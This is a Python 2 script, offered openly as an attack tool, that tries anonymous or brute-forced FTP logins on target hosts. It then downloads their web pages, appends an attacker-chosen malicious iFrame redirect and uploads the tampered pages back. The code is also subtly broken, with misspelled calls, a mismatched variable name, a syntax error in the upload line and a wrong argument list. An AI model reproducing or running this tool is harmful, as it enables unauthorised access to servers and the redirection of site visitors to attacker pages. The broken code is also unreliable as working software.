import ftplib
import optparse
import time

def anonLogin(hostname):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login('anonymous', 'me@your.com')
        print '\n[*] ' + str(hostname) + ' FTP anonymous login succeeded.'
        
        ftp.quit()
        return True
    except Exception, e:
        print '\n[-] ' + str(hostname) + ' FTP anoymous login failed.'
        return False

def bruteLogin(hostname, passwdFile):
    pF = open(passwdFile, 'r')
    for line in pf.readlines():
        time.sleep()
        userName = line.split(':')[0]
        passWord = line.split(':')[1].strip('\r').strip('\n')
        print '[+] Trying: ' + userName + passWord

        try:
            ftp = ftplib.FTP(hostname)
            ftp.lgin(userName, passWord)
            print '\n[*] ' + str(hostname) + ' FTP login succeeded: ' + userName + '/' + passWord
            ftp.quit()
            return (userName, passWord)

        except Exception, e:
            pass
    
    print '\n[-] Could not brute force FTP credentials.'
    return (None, None)

def returnDefault(ftp):
    try:
        dirList = ftp.nlst()
    except:
        dirList = []
        print '[-] Could not list directory contents.'
        print '[-] Skipping to next target.'
        return

    retList = []
    for fileName in dirList:
        fn = fileName.lower()
        if '.php' in fn or '.htm' in fn or '.asp' in fn:
            print '[+] Found default page: ' + fileName
        retList.append(fileName)
    return retList

def injectPage(ftp, page, redirect):
    f = open(page + '.tmp', 'w')
    ftp.retrlines('RETR', page, f.write)
    print '[+] Downloaded page: ' + page
    
    f.write(redirect)
    f.close()

    print '[+] Injected malicious iFrame on: ' + page
    ftp.storlines('STOR ' = page, open(page + '.tmp'))

    print '[+] Uploaded injected page: ' + page

def attack(username, password, tgtHost, redirect):
    ftp = ftplib.FTP(tgtHost)
    ftp.login(username, password)
    defPages = returnDefault(ftp)

    for defPage in defPages:
        injectPage(ftp, defPage, redirect)

def main():
    parser = optparse.OptionParser('usage%prog ' + '-H <target host[s]> -r <redirect page> [-f <userpass file>]')

    parser.add_option('-H', dest='tgtHosts', type='string', help='specify target host')
    parser.add_option('-f', dest='passwdFile', type='string', help='specify user/password file')
    parser.add_option('-r', dest='redirect', type='string', help='specify a redirection page')

    (options, args) = parser.parse_args()
    tgtHosts = str(options.tgtHosts).split(', ')
    passwdFile = options.passwdFile
    redirect = options.redirect

    if tgtHosts == None or redirect == None:
        print parser.usage
        exit(0)

    for tgtHost in tgtHosts:
        username = None
        password = None

        if anonLogin(tgtHost) == True:
            username = 'anonymous'
            password = 'me@your.com'
            print '[+] Using anonymous credentials to attack.'
            
            attack(username, tgtHost, redirect)

        elif passwdFile != None:
            (username, password) = bruteLogin(tgtHost, passwdFile)

        if password != None:
            print '[+] Using creds: ' + username + '/' + password + ' to attack.'
            attack(username, password, tgtHost, redirect)

if __name__ == '__main__':
    main()